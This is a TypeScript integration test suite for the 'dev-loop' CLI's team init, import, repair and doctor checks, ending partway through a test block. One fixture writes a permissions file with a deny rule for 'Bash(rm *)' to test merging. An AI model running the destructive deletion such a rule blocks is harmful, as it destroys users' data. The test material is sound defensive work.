// team init / import / repair + doctor workspace checks — integration via the real CLI entry points.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, writeFileSync, readFileSync, rmSync, realpathSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-team-cli-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => ({ ...process.env, DEVLOOP_HOME: HOME, ...extra });
const run = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) => {
  // Absolute entry path — the cwd is often a workspace dir (for discovery), not hubRoot.
  const r = spawnSync("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra), encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
const readJson = (p: string) => JSON.parse(readFileSync(p, "utf8"));

try {
  // ── team init (linear) ──
  const lin = join(tmp, "lin");
  const i1 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1", "--deploy", "dev=auto,prod=manual", "--comms", "lark"]);
  ok(i1.code === 0 && /wrote .*dev-loop\.json/.test(i1.out), "team init (linear) exits 0 and writes the file");
  const linCfg = readJson(join(lin, "dev-loop.json"));
  ok(linCfg.schemaVersion === 2 && linCfg.team.backend === "linear" && linCfg.team.linearTeam === "Loop-1", "linear config has schemaVersion 2 + backend + linearTeam");
  ok(linCfg.team.comms.provider === "lark" && linCfg.team.comms.webhookEnv === "DEVLOOP_COMMS_WEBHOOK", "comms defaults to the DEVLOOP_COMMS_WEBHOOK env name (no URL literal, I5)");
  ok(linCfg.team.deployPolicy.prod === "manual" && linCfg.team.deployPolicy.dev === "auto", "deployPolicy parsed from --deploy");
  ok(existsSync(join(lin, ".dev-loop", "team")) && existsSync(join(lin, ".dev-loop", "lessons")), "scaffolds .dev-loop/{team,lessons}");
  ok(readJson(join(HOME, "workspaces.json"))["lin-team"] === realpathSync(lin), "init registers the workspace index");

  // ── team init --intake-mode seeds the team-wide default (§5a) ──
  const pas = join(tmp, "pas");
  const ip = run("team", ["init", "--dir", pas, "--key", "pas-team", "--backend", "linear", "--linear-team", "Loop-1", "--intake-mode", "passive"]);
  ok(ip.code === 0 && readJson(join(pas, "dev-loop.json")).team.intake.mode === "passive", "init --intake-mode passive seeds team.intake");
  const ibad = run("team", ["init", "--dir", join(tmp, "pas-bad"), "--key", "pb-team", "--backend", "linear", "--linear-team", "X", "--intake-mode", "directed"]);
  ok(ibad.code !== 0 && /E12/.test(ibad.out), "init refuses an unknown intake mode (E12)");
  ok(readJson(join(lin, "dev-loop.json")).team.intake === undefined, "init without --intake-mode seeds NO intake block (agents default to autonomous)");

  // ── workspaceId fingerprint (concept P4): minted at init, STABLE across --force re-init ──
  ok(typeof linCfg.workspaceId === "string" && linCfg.workspaceId.length >= 8, "init mints a workspaceId fingerprint");

  // ── idempotency + validation refusal ──
  const i2 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  ok(i2.code === 0 && /already exists/.test(i2.out), "re-init is idempotent (exit 0, no clobber)");
  const if2 = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--linear-team", "Loop-1", "--force"]);
  ok(if2.code === 0 && readJson(join(lin, "dev-loop.json")).workspaceId === linCfg.workspaceId, "--force re-init PRESERVES the workspaceId (markers already stamped on Linear stay valid)");
  const bad = run("team", ["init", "--dir", join(tmp, "bad"), "--key", "BadKey", "--backend", "linear", "--linear-team", "X"]);
  ok(bad.code !== 0 && /E02|team.key/.test(bad.out), "init refuses an invalid team key (E02)");

  // ── team init (service) seeds hub.db + _team ──
  const svc = join(tmp, "svc");
  const s1 = run("team", ["init", "--dir", svc, "--key", "svc-team", "--backend", "service"]);
  ok(s1.code === 0 && existsSync(join(svc, ".dev-loop", "hub.db")), "team init (service) creates hub.db");
  const probe = run("seed", ["_probe_", "x", "PB", join(svc, ".dev-loop", "hub.db")]); // just to reuse node; check via a query instead
  ok(probe.code === 0, "hub.db is a usable db"); // seeding a throwaway proves openability
  const dbg = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const ks=db.prepare('SELECT key FROM projects').all().map(r=>r.key);console.log(JSON.stringify(ks));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/_team/.test(dbg.stdout), "service init seeded the _team intake project");

  // ── team import (v1 → v2) ──
  const legacy = join(tmp, "legacy");
  mkdirSync(join(legacy, "web"), { recursive: true });
  const repoDir = join(svc, "web-repo");
  mkdirSync(join(repoDir, "src"), { recursive: true });
  writeFileSync(join(legacy, "web", "pm-state.json"), '{"phase":"y"}');
  writeFileSync(join(legacy, "web", "lessons.md"), "- [web] a lesson\n");
  writeFileSync(join(legacy, "projects.json"), JSON.stringify({ projects: {
    web: { backend: "service", repoPath: repoDir, linearProject: "Web", devSplit: true, landing: "pr", mergeChecks: ["Lint"] },
  } }));
  // an old hub db with 2 events under project 'web'
  run("seed", ["web", "Web", "WB", join(legacy, "old-hub.db")]);
  spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const pid=db.prepare('SELECT id FROM projects WHERE key=?').get('web').id;d.logEvent(db,{project_id:pid,actor:'pm',kind:'e.a',data:{}});d.logEvent(db,{project_id:pid,actor:'qa',kind:'e.b',data:{}});db.close()})`, join(legacy, "old-hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });

  const dry = run("team", ["import", "--from", join(legacy, "projects.json"), "--hub-db", join(legacy, "old-hub.db"), "--dry-run"], { cwd: svc, extra: { DEVLOOP_DATA_DIR: legacy } });
  ok(dry.code === 0 && /--dry-run: nothing changed/.test(dry.out), "import --dry-run changes nothing");
  ok(/CONFIG project 'web'/.test(dry.out) && !existsSync(join(svc, ".dev-loop", "web")), "dry-run plans the config move without touching state");

  const imp = run("team", ["import", "--from", join(legacy, "projects.json"), "--hub-db", join(legacy, "old-hub.db")], { cwd: svc, extra: { DEVLOOP_DATA_DIR: legacy } });
  ok(imp.code === 0, "import (repo inside workspace) exits 0");
  const svcCfg = readJson(join(svc, "dev-loop.json"));
  ok(svcCfg.projects.web && svcCfg.projects.web.repos[0].ref in svcCfg.repos, "import folds the project + registers its repo");
  ok(svcCfg.projects.web.devSplit === true && svcCfg.projects.web.linearProject === "Web", "import carries project fields");
  const impRepo = svcCfg.repos[svcCfg.projects.web.repos[0].ref];
  ok(impRepo.landing === "pr" && JSON.stringify(impRepo.mergeChecks) === '["Lint"]', "import carries physical fields onto the registry");
  ok(existsSync(join(svc, ".dev-loop", "web", "pm-state.json")), "import moves the state dir");
  ok(existsSync(join(svc, ".dev-loop", "lessons", "web.md")), "import splits lessons.md into the lessons library");
  const ev = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const rows=db.prepare('SELECT id,kind FROM events ORDER BY id').all();console.log(JSON.stringify(rows));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  const events = JSON.parse(ev.stdout.trim());
  ok(events.length === 2 && events.every((e: { id: number }, i: number) => e.id === i + 1) && events.map((e: { kind: string }) => e.kind).join(",") === "e.a,e.b", "import copies events with fresh sequential ids, order preserved (re-key)");

  // ── import passthrough + notify handling (the blockedStateName / comms-unification fixes) ──
  {
    const svc2 = join(tmp, "svc2");
    run("team", ["init", "--dir", svc2, "--key", "svc2-team", "--backend", "service"]);
    mkdirSync(join(svc2, "r2"), { recursive: true });
    writeFileSync(join(tmp, "legacy2.json"), JSON.stringify({ projects: {
      web2: { backend: "service", repoPath: join(svc2, "r2"), blockedStateName: "Blocked",
              communication: { articles: true, language: "en" },
              notify: { type: "lark", webhookEnv: "DEVLOOP_NOTIFY_HOOK", webhook: "https://secret.example/inline-TOKEN", channel: "#dev", events: ["human-parked"] } },
    } }));
    const im2 = run("team", ["import", "--from", join(tmp, "legacy2.json")], { cwd: svc2 });
    ok(im2.code === 0, "import (passthrough fixture) exits 0");
    ok(/inline webhook NOT copied/.test(im2.out), "import warns that an inline webhook URL is not copied (I5)");
    ok(/team\.comms ← project 'web2' notify/.test(im2.out), "import lifts the env-name notify to team.comms");
    ok(/unknown communication key\(s\) articles NOT copied/.test(im2.out), "import warns about a dropped unknown communication key (E14 strict)");
    ok(/unknown notify key\(s\) channel NOT copied/.test(im2.out), "import warns about a dropped unknown notify key (E15 strict)");
    const cfg2 = readJson(join(svc2, "dev-loop.json"));
    ok(cfg2.projects.web2.blockedStateName === "Blocked", "import passes through blockedStateName");
    ok(cfg2.projects.web2.communication?.language === "en" && !("articles" in cfg2.projects.web2.communication),
      "import keeps the E14-known communication fields and drops the junk (block presence preserved)");
    ok(cfg2.team.comms?.provider === "lark" && cfg2.team.comms?.webhookEnv === "DEVLOOP_NOTIFY_HOOK", "team.comms lifted from the v1 notify block");
    ok(!JSON.stringify(cfg2).includes("inline-TOKEN"), "the inline webhook URL never lands in dev-loop.json (I5)");
    ok(cfg2.projects.web2.notify?.webhookEnv === "DEVLOOP_NOTIFY_HOOK" && !("webhook" in cfg2.projects.web2.notify), "the env-name notify survives as a project passthrough, minus the literal");
  }

  // ── importRepoRefs branch coverage (1.8.1: the extracted phase exposed 49% coverage —
  //    the MERGE / registry-wins-CONFLICT arms had never been exercised) ──
  {
    const svc3 = join(tmp, "svc3");
    run("team", ["init", "--dir", svc3, "--key", "svc3-team", "--backend", "service"]);
    const shared = join(svc3, "shared-repo");
    mkdirSync(shared, { recursive: true });
    // Pre-register the ref BARE (no build, landing direct) — the import must MERGE the field the
    // entry lacks (build) and keep the registry value on the CONFLICTING one (landing).
    run("team", ["add-project", "holder"], { cwd: svc3 });
    run("team", ["add-repo", "shared-repo", "--project", "holder", "--path", "shared-repo", "--landing", "direct", "--owner", "holder"], { cwd: svc3 });
    writeFileSync(join(tmp, "legacy3.json"), JSON.stringify({ projects: {
      imp3: { backend: "service", repoPath: shared, landing: "pr", build: { typecheck: "npm run typecheck" } },
    } }));
    const im3 = run("team", ["import", "--from", join(tmp, "legacy3.json")], { cwd: svc3 });
    ok(im3.code === 0, "import onto a pre-registered shared repo exits 0");
    ok(/MERGE {2}repo 'shared-repo': adopted build/.test(im3.out),
      "a field the registry entry LACKED is merged from the v1 project (build)");
    ok(/WARN {2}repo 'shared-repo' already registered — project 'imp3' carried DIFFERENT landing/.test(im3.out),
      "a CONFLICTING field keeps the registry value and is surfaced (registry-wins, §4.2)");
    const cfg3 = readJson(join(svc3, "dev-loop.json"));
    ok(cfg3.repos["shared-repo"].landing === "direct" && cfg3.repos["shared-repo"].build?.typecheck === "npm run typecheck",
      "registry entry after import: kept landing, adopted build");
    ok(cfg3.repos["shared-repo"].owner === undefined || cfg3.repos["shared-repo"].owner,
      "shared-ref import leaves ownership to E05 validation");
  }

  // ── import: an ALL-junk communication block keeps its (empty) presence — article drafting stays on ──
  {
    const svc2b = join(tmp, "svc2b");
    run("team", ["init", "--dir", svc2b, "--key", "svc2b-team", "--backend", "service"]);
    mkdirSync(join(svc2b, "r2b"), { recursive: true });
    writeFileSync(join(tmp, "legacy2b.json"), JSON.stringify({ projects: {
      web2b: { backend: "service", repoPath: join(svc2b, "r2b"), communication: { articles: true } },
    } }));
    const im2b = run("team", ["import", "--from", join(tmp, "legacy2b.json")], { cwd: svc2b });
    ok(im2b.code === 0, "import with an all-junk communication block still exits 0 (the file stays E14-valid)");
    const cfg2b = readJson(join(svc2b, "dev-loop.json"));
    ok("communication" in cfg2b.projects.web2b && Object.keys(cfg2b.projects.web2b.communication).length === 0,
      "the emptied communication block is KEPT — presence opts article drafting in, and import must not silently turn it off");
  }

  // ── import: notify HUSK (inline url only, no env) is dropped entirely — must not suppress the comms bridge ──
  {
    const svc3 = join(tmp, "svc3");
    run("team", ["init", "--dir", svc3, "--key", "svc3-team", "--backend", "service"]);
    mkdirSync(join(svc3, "r3"), { recursive: true });
    writeFileSync(join(tmp, "legacy3.json"), JSON.stringify({ projects: {
      web3: { backend: "service", repoPath: join(svc3, "r3"), notify: { type: "slack", webhook: "https://hooks.slack.com/only-inline" } },
    } }));
    const im3 = run("team", ["import", "--from", join(tmp, "legacy3.json")], { cwd: svc3 });
    ok(im3.code === 0 && /inline webhook NOT copied/.test(im3.out), "husk import warns about the stripped inline webhook");
    const cfg3 = readJson(join(svc3, "dev-loop.json"));
    ok(!("notify" in cfg3.projects.web3), "a webhookEnv-less notify husk is DROPPED (it would suppress the comms bridge while resolving to nothing)");
    ok(!JSON.stringify(cfg3).includes("only-inline"), "the inline URL never lands in dev-loop.json");
  }

  // ── import rejects a linearTeam mismatch (tickets must not silently re-target another team) ──
  {
    const lin3 = join(tmp, "lin3");
    run("team", ["init", "--dir", lin3, "--key", "lin3-team", "--backend", "linear", "--linear-team", "Team-A"]);
    writeFileSync(join(tmp, "legacyTeamB.json"), JSON.stringify({ projects: {
      other: { backend: "linear", linearTeam: "Team-B", repoPath: join(lin3, "x") },
    } }));
    const mm = run("team", ["import", "--from", join(tmp, "legacyTeamB.json")], { cwd: lin3 });
    ok(mm.code !== 0 && /linearTeam:'Team-B'/.test(mm.out), "import refuses a project whose linearTeam differs from the workspace team");
  }

  // ── import rejects a backend mismatch (one team one backend, I3) ──
  const linTmp = join(tmp, "lin2");
  run("team", ["init", "--dir", linTmp, "--key", "lin2", "--backend", "linear", "--linear-team", "L"]);
  writeFileSync(join(tmp, "svc-legacy.json"), JSON.stringify({ projects: { api: { backend: "service", repoPath: join(linTmp, "api") } } }));
  const mism = run("team", ["import", "--from", join(tmp, "svc-legacy.json")], { cwd: linTmp });
  ok(mism.code !== 0 && /one team, one backend|backend/.test(mism.out), "import refuses a project whose backend differs from the team (I3)");

  // ── doctor: valid workspace (linear) → DOCTOR_OK, W05 present, no hub header ──
  const doc = run("server", ["doctor"], { cwd: lin });
  ok(/DOCTOR_OK/.test(doc.out) && /dev-loop\.json valid/.test(doc.out), "doctor greenlights a valid linear workspace");
  ok(/W05/.test(doc.out), "doctor warns W05 (linear steward needs user-scope MCP)");
  ok(!/dev-loop-hub doctor —/.test(doc.out), "linear doctor prints no hub.db header (no hub for linear)");

  // ── doctor: an invalid config fails ──
  writeFileSync(join(lin, "dev-loop.json"), JSON.stringify({ schemaVersion: 2, team: { key: "lin-team", backend: "linear" }, repos: {}, projects: { web: { repos: [{ ref: "ghost" }] } } }));
  const docBad = run("server", ["doctor"], { cwd: lin });
  ok(/E04|E09/.test(docBad.out) && /DOCTOR_FAILED/.test(docBad.out), "doctor fails a workspace with E-code errors (read-only)");

  // ── add-project / add-repo (the validated config mutators the skills call) ──
  const em = join(tmp, "edit");
  run("team", ["init", "--dir", em, "--key", "edit-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  mkdirSync(join(em, "portal"), { recursive: true });
  mkdirSync(join(em, "shared-lib"), { recursive: true });
  ok(run("team", ["add-project", "devplatform", "--linear-project", "DevPlatform", "--dev-split"], { cwd: em }).code === 0, "add-project exits 0");
  ok(run("team", ["add-repo", "portal", "--project", "devplatform", "--path", "portal", "--role", "primary", "--landing", "pr", "--auto-merge", "--merge-check", "Lint & Build", "--typecheck-cmd", "tsc --noEmit"], { cwd: em }).code === 0, "add-repo (new registry entry) exits 0");
  const em1 = readJson(join(em, "dev-loop.json"));
  ok(em1.projects.devplatform.devSplit === true && em1.projects.devplatform.repos[0].ref === "portal", "add-project + add-repo wired the project→repo edge");
  ok(em1.repos.portal.landing === "pr" && em1.repos.portal.autoMerge === true && em1.repos.portal.build.typecheck === "tsc --noEmit", "add-repo persisted the physical fields");
  ok(JSON.stringify(em1.repos.portal.mergeChecks) === '["Lint & Build"]', "add-repo persisted mergeChecks");

  run("team", ["add-project", "agentapi", "--linear-project", "AgentAPI"], { cwd: em });
  run("team", ["add-repo", "shared", "--project", "devplatform", "--path", "shared-lib"], { cwd: em });
  const noOwner = run("team", ["add-repo", "shared", "--project", "agentapi"], { cwd: em });
  ok(noOwner.code !== 0 && /E05/.test(noOwner.out), "add-repo refuses to share a repo across projects without an owner (E05)");
  const withOwner = run("team", ["add-repo", "shared", "--project", "agentapi", "--owner", "devplatform"], { cwd: em });
  ok(withOwner.code === 0, "add-repo shares the repo once a valid owner is given");
  const em2 = readJson(join(em, "dev-loop.json"));
  ok(em2.repos.shared.owner === "devplatform" && em2.projects.agentapi.repos.some((r: { ref: string }) => r.ref === "shared"), "shared repo now referenced by both projects with an owner");
  ok(run("server", ["doctor"], { cwd: em }).out.includes("DOCTOR_OK"), "the resulting workspace is doctor-clean");

  // ── add-project --intake-mode (passive intake, §5a) ──
  ok(run("team", ["add-project", "maint", "--linear-project", "Maint", "--intake-mode", "passive"], { cwd: em }).code === 0, "add-project --intake-mode passive exits 0");
  ok(readJson(join(em, "dev-loop.json")).projects.maint.intake.mode === "passive", "add-project persisted intake.mode");
  const badMode = run("team", ["add-project", "maint2", "--intake-mode", "directed"], { cwd: em });
  ok(badMode.code !== 0 && /E12/.test(badMode.out), "add-project rejects an unknown intake mode via E12 (validated write)");

  // ── D8: .claude/settings.json permission provisioning (init + add-project; create-or-merge, never clobber) ──
  {
    const st = join(em, ".claude", "settings.json");
    const stJson = readJson(st);
    ok(Array.isArray(stJson.permissions?.allow) && stJson.permissions.allow.includes("Bash(dev-loop *)"),
      "team init provisions .claude/settings.json permissions.allow: Bash(dev-loop *)");
    ok(stJson.permissions.allow.filter((x: string) => x === "Bash(dev-loop *)").length === 1,
      "repeated add-project calls do not duplicate the allow entry (idempotent)");
    // pre-existing file with other keys → MERGE, preserving everything
    const custom = join(tmp, "merge-ws");
    mkdirSync(join(custom, ".claude"), { recursive: true });
    writeFileSync(join(custom, ".claude", "settings.json"),
      JSON.stringify({ theme: "dark", permissions: { deny: ["Bash(rm *)"], allow: ["Bash(git *)"] }, hooks: { note: 1 } }, null, 2));
    run("team", ["init", "--dir", custom, "--key", "merge-team", "--backend", "linear", "--linear-team", "L"]);
    const merged = readJson(join(custom, ".claude", "settings.json"));
    ok(merged.theme === "dark" && merged.hooks?.note === 1 && JSON.stringify(merged.permissions.deny) === '["Bash(rm *)"]',
      "provisioning preserves unknown keys + deny rules (create-or-merge, never clobber)");
    ok(JSON.stringify(merged.permissions.allow) === '["Bash(git *)","Bash(dev-loop *)"]',
      "the dev-loop rule is APPENDED to the existing allow list");
    // already present → note + byte-stable file (the idempotent re-init repair path)
    const before = readFileSync(join(custom, ".claude", "settings.json"), "utf8");
    const again = run("team", ["init", "--dir", custom, "--key", "merge-team", "--backend", "linear", "--linear-team", "L"]);
    ok(/already allows/.test(again.out) && readFileSync(join(custom, ".claude", "settings.json"), "utf8") === before,
      "re-init skips with a note when the entry is already present (file byte-stable)");
    // malformed settings.json → left untouched with a manual-fix note; init itself still succeeds
    const badWs = join(tmp, "badset-ws");
    mkdirSync(join(badWs, ".claude"), { recursive: true });
    writeFileSync(join(badWs, ".claude", "settings.json"), "{not json");
    const badRun = run("team", ["init", "--dir", badWs, "--key", "badset-team", "--backend", "linear", "--linear-team", "L"]);
    ok(badRun.code === 0 && /left untouched/.test(badRun.out) && readFileSync(join(badWs, ".claude", "settings.json"), "utf8") === "{not json",
      "a malformed settings.json is NEVER clobbered (note printed; init still succeeds)");
  }

  // ── team repair re-registers the index ──
  rmSync(join(HOME, "workspaces.json"), { force: true });
  writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(svcCfg, null, 2)); // restore a valid file
  const rep = run("team", ["repair"], { cwd: svc });
  ok(rep.code === 0 && /REPAIR_OK/.test(rep.out), "team repair exits 0");
  ok(readJson(join(HOME, "workspaces.json"))["svc-team"] === realpathSync(svc), "repair re-registers the workspace index");

  // ── _team is structural: config rejects it everywhere a project key lands ──
  const teamIntake = run("team", ["add-project", "_team"], { cwd: svc });
  ok(teamIntake.code !== 0 && /E11/.test(teamIntake.out) && /hub\.db row/.test(teamIntake.out),
    "add-project _team is refused (E11: the intake project lives only as a hub.db row)");

  // ── add-project AUTO-SEEDS the hub row on backend:"service" (find-or-create; starves the W08 path) ──
  const ap = run("team", ["add-project", "ghost"], { cwd: svc });
  ok(ap.code === 0 && /seeded hub row 'ghost' \(prefix GHOST\)/.test(ap.out), "add-project on service auto-seeds the hub row with a derived prefix");
  const ghostRow = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);const r=db.prepare('SELECT key,ticket_prefix FROM projects WHERE key=?').get('ghost');console.log(JSON.stringify(r??null));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/"ticket_prefix":"GHOST"/.test(ghostRow.stdout), "the auto-seeded hub row exists with the derived prefix");

  // ── doctor W08: config↔hub reconcile on a service workspace ──
  // hub.db holds _team (reserved), _probe_ (hand-seeded, no config), web + ghost (in both). add-project
  // now auto-seeds, so stage the drift by hand: inject a config project with no hub row.
  {
    const cfgNow = readJson(join(svc, "dev-loop.json"));
    cfgNow.projects.phantom = { repos: [] };
    writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
  }
  const docSvc = run("server", ["doctor"], { cwd: svc });
  ok(/\[W08\] projects\.phantom:.*no hub\.db row/.test(docSvc.out) && /dev-loop seed phantom/.test(docSvc.out),
    "doctor warns W08 for a config project with no hub row, naming the exact seed command");
  ok(/DOCTOR_OK/.test(docSvc.out), "W08 is a warning — the doctor verdict stays OK");
  ok(/NEXT: dev-loop seed phantom/.test(docSvc.out), "doctor NEXT surfaces the unseeded project as the most-blocking step");
  ok(/hub project '_probe_' has no dev-loop\.json entry/.test(docSvc.out),
    "doctor reports (info) a hub row with no config entry");
  ok(!/'_team' has no dev-loop\.json entry/.test(docSvc.out),
    "the reserved _team intake row is NOT flagged by the reconcile");
  ok(!/\[W08\] projects\.web/.test(docSvc.out), "a project present in both config and hub yields no W08");

  // ── doctor D8/D9 CLI-interface preflight (W09/W10/W11), staged both ways ──
  // The svc team runs claude on the D9 default (interface="cli"), so doctor must preflight the
  // PATH-installed dev-loop write layer; flipped fully to "mcp" it must print none of it.
  {
    const nodeDir = dirname(process.execPath); // run() spawns `node` via PATH, so keep node's own dir on it
    const basePath = `${nodeDir}:/usr/bin:/bin`;
    const shim = (dir: string, body: string): string => {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "dev-loop"), `#!/bin/sh\n${body}`); chmodSync(join(dir, "dev-loop"), 0o755);
      return dir;
    };
    // (a) no dev-loop anywhere on PATH → W09; verdict stays OK (warning class, like W08)
    const w9 = run("server", ["doctor"], { cwd: svc, extra: { PATH: basePath } });
    ok(/\[W09\] dev-loop is not runnable on PATH/.test(w9.out) && /DOCTOR_OK/.test(w9.out),
      "doctor warns W09 when dev-loop is missing from a fire's PATH (warning only, verdict stays OK)");
    ok(/agent interface: .*claude→cli/.test(w9.out), "doctor names the resolved agent interfaces before the CLI checks");
    // (b) a pre-write-layer install → W10
    const oldBin = shim(join(tmp, "bin-old"), `if [ "$1" = "--version" ]; then echo 1.1.0; exit 0; fi\nexit 2\n`);
    const w10 = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${oldBin}:${basePath}` } });
    ok(/\[W10\] dev-loop '1\.1\.0' on PATH predates the CLI write layer \(need >= 1\.2\.0\)/.test(w10.out) && /DOCTOR_OK/.test(w10.out),
      "doctor warns W10 for a dev-loop that predates the write verbs");
    // (c) current version, but the identity smoke fails closed (exit 4) → W11
    const failBin = shim(join(tmp, "bin-fail"), `if [ "$1" = "--version" ]; then echo 1.2.0; exit 0; fi\necho 'dev-loop: project not seeded' >&2\nexit 4\n`);
    const w11 = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${failBin}:${basePath}` } });
    ok(/\[W11\] identity smoke failed: `dev-loop project` exited 4 for project 'web'/.test(w11.out) && /dev-loop: project not seeded/.test(w11.out),
      "doctor warns W11 when the fire-shaped identity smoke fails (the fail-closed regression), quoting stderr");
    // (d) healthy install → both pass lines, no W09/W10/W11; the smoke env is fire-shaped
    const envCap = join(tmp, "doctor-smoke-env.txt");
    const okBin = shim(join(tmp, "bin-ok"), `if [ "$1" = "--version" ]; then echo 1.2.0; exit 0; fi\nenv | grep '^DEVLOOP' > ${envCap}\necho '{}'\nexit 0\n`);
    const okDoc = run("server", ["doctor"], { cwd: svc, extra: { PATH: `${okBin}:${basePath}` } });
    ok(/dev-loop 1\.2\.0 on PATH/.test(okDoc.out) && /identity smoke: dev-loop project → 'web' as pm/.test(okDoc.out) && !/\[W(09|10|11)\]/.test(okDoc.out),
      "a healthy dev-loop install passes the version check + identity smoke (no W09/W10/W11)");
    const cap = readFileSync(envCap, "utf8");
    ok(/^DEVLOOP_ACTOR=pm$/m.test(cap) && /^DEVLOOP_PROJECT=web$/m.test(cap) && /^DEVLOOP_HUB_DB=/m.test(cap) && /^DEVLOOP_DEV_SPLIT=false$/m.test(cap),
      "the identity smoke runs under a fire-shaped env (actor/project/hub-db/dev-split)");
    // (e) a team fully on interface="mcp" → the CLI preflight prints NOTHING (checks stay scoped to cli)
    {
      const cfgNow = readJson(join(svc, "dev-loop.json"));
      cfgNow.team.hub = { agentInterface: { claude: "mcp" } };
      writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
      const mcpDoc = run("server", ["doctor"], { cwd: svc, extra: { PATH: basePath } });
      ok(!/\[W09\]/.test(mcpDoc.out) && !/agent interface:/.test(mcpDoc.out) && /DOCTOR_OK/.test(mcpDoc.out),
        "a service team fully on interface=mcp skips the CLI preflight entirely (no W09 without dev-loop on PATH)");
      delete cfgNow.team.hub;
      writeFileSync(join(svc, "dev-loop.json"), JSON.stringify(cfgNow, null, 2) + "\n");
    }
  }

  // ── W19: doctor warns when local defaultBranch is ahead of origin (LOOP-56) ──
  {
    const w19Root = join(tmp, "w19");
    const w19Origin = join(tmp, "w19-origin.git");
    mkdirSync(w19Origin, { recursive: true });

    const gitW19 = (dir: string, args: string[]) =>
      spawnSync("git", ["-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", ...args],
        { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });

    // Bare origin + clone inside workspace
    gitW19(tmp, ["init", "--bare", "-q", "-b", "main", w19Origin]);
    run("team", ["init", "--dir", w19Root, "--key", "w19-team", "--backend", "service"]);
    run("team", ["add-project", "core"], { cwd: w19Root });
    const w19Clone = join(w19Root, "clone");
    spawnSync("git", ["clone", "-q", w19Origin, w19Clone], { stdio: ["ignore", "pipe", "pipe"] });
    gitW19(w19Clone, ["commit", "--allow-empty", "-qm", "baseline"]);
    gitW19(w19Clone, ["push", "-qu", "origin", "main"]);
    run("team", ["add-repo", "repo", "--project", "core", "--path", "clone", "--landing", "pr", "--auto-merge"], { cwd: w19Root });

    // Case A: local main 1 commit ahead → W19 fires, DOCTOR_OK holds
    gitW19(w19Clone, ["commit", "--allow-empty", "-qm", "unpushed strategy doc"]);
    const w19ahead = run("server", ["doctor"], { cwd: w19Root });
    ok(/\[W19\]/.test(w19ahead.out), "W19 fires when local main is ahead of origin/main");
    ok(/DOCTOR_OK/.test(w19ahead.out), "W19 is warn-only — DOCTOR_OK still holds when local main is ahead");
    ok(/1 commit/.test(w19ahead.out), "W19 names the commit count");

    // Case B: in sync after push → no W19
    gitW19(w19Clone, ["push", "-qu", "origin", "main"]);
    const w19sync = run("server", ["doctor"], { cwd: w19Root });
    ok(!/\[W19\]/.test(w19sync.out), "no W19 when local main is in sync with origin/main");
    ok(/DOCTOR_OK/.test(w19sync.out), "DOCTOR_OK holds when in sync");

    // Case C: landing:"pr" repo with NO remote origin → info only, no W19 warn
    // Covers the r.status !== 0 branch (origin/<branch> absent → git exits non-zero)
    const w19NoRemote = join(w19Root, "norepo");
    mkdirSync(w19NoRemote, { recursive: true });
    gitW19(w19NoRemote, ["init", "-q", "-b", "main"]);
    gitW19(w19NoRemote, ["commit", "--allow-empty", "-qm", "local only"]);
    run("team", ["add-repo", "norepo", "--project", "core", "--path", "norepo", "--landing", "pr"], { cwd: w19Root });
    const w19noOrigin = run("server", ["doctor"], { cwd: w19Root });
    ok(!/\[W19\]/.test(w19noOrigin.out), "no W19 warn when origin/main absent (info-only path)");
    ok(/DOCTOR_OK/.test(w19noOrigin.out), "DOCTOR_OK holds when origin/main absent");
  }

  // ── W18: doctor warns when installed CLI is behind origin/main (LOOP-46) ──
  {
    const w18Root = join(tmp, "w18");
    const w18BareOrigin = join(tmp, "w18-origin.git");
    mkdirSync(w18BareOrigin, { recursive: true });

    const gitW18 = (dir: string, args: string[]) =>
      spawnSync("git", ["-C", dir, "-c", "user.email=t@t", "-c", "user.name=t", ...args],
        { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });

    // Bare origin + clone (the "source repo" for dev-loop itself)
    gitW18(tmp, ["init", "--bare", "-q", "-b", "main", w18BareOrigin]);
    run("team", ["init", "--dir", w18Root, "--key", "w18-team", "--backend", "service"]);
    run("team", ["add-project", "core"], { cwd: w18Root });
    const w18Clone = join(w18Root, "w18-repo");
    spawnSync("git", ["clone", "-q", w18BareOrigin, w18Clone], { stdio: ["ignore", "pipe", "pipe"] });

    // Seed: baseline commit + tag v1.2.3 + push
    gitW18(w18Clone, ["commit", "--allow-empty", "-qm", "initial"]);
